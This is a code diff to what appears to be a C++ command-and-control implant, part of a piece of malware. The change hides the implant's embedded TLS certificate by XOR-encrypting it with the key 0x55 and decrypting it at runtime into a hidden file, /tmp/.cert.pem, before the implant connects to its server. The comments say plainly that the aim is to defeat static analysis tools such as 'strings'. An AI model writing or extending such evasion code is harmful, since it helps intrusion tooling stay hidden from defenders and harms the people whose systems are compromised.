@@ -1,6 +1,7 @@
 #include "implant.h"
 #include "tasks.h"
-#include "cert_embedded.h"
+// #include "cert_embedded.h"
+# include "cert_encrypted.h"
 
 #include <fstream>
 #include <cstdio>
@@ -49,10 +50,23 @@ using json = nlohmann::json;
     std::string fullServerUrl = ss.str();
 
     //write embedded cert to temporary file
-    std::string tempCertPath = "/tmp/.cert.pem";
+    // std::string tempCertPath = "/tmp/.cert.pem";
+    // {
+    //     std::ofstream certFile(tempCertPath, std::ios::binary);
+    //     certFile.write(reinterpret_cast<const char*>(cert_pem), cert_pem_len);
+    // }
+
+    std::string tempCertPath = "/tmp/.cert.pem"; //this is the path to temp cert file that will be written
+    // to and used for SSL connection, file is deleted after use
+    // the cert is XOR encrypted in the header file and decrypted here before writing to disk to make static 
+    // analysis more difficult (strings are easily extracted from binaries with tools like strings)
     {
-        std::ofstream certFile(tempCertPath, std::ios::binary);
-        certFile.write(reinterpret_cast<const char*>(cert_pem), cert_pem_len);
+        std::ofstream certFile(tempCertPath, std::ios::binary); //and this is the decryption loop so 
+        //there should not need to be decryption of the key elsewhere
+        for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
+            char c = enc_cert_pem[i] ^ 0x55;
+            certFile.write(&c, 1);
+        }
     }
 
     cpr::SslOptions sslOpts = cpr::Ssl(
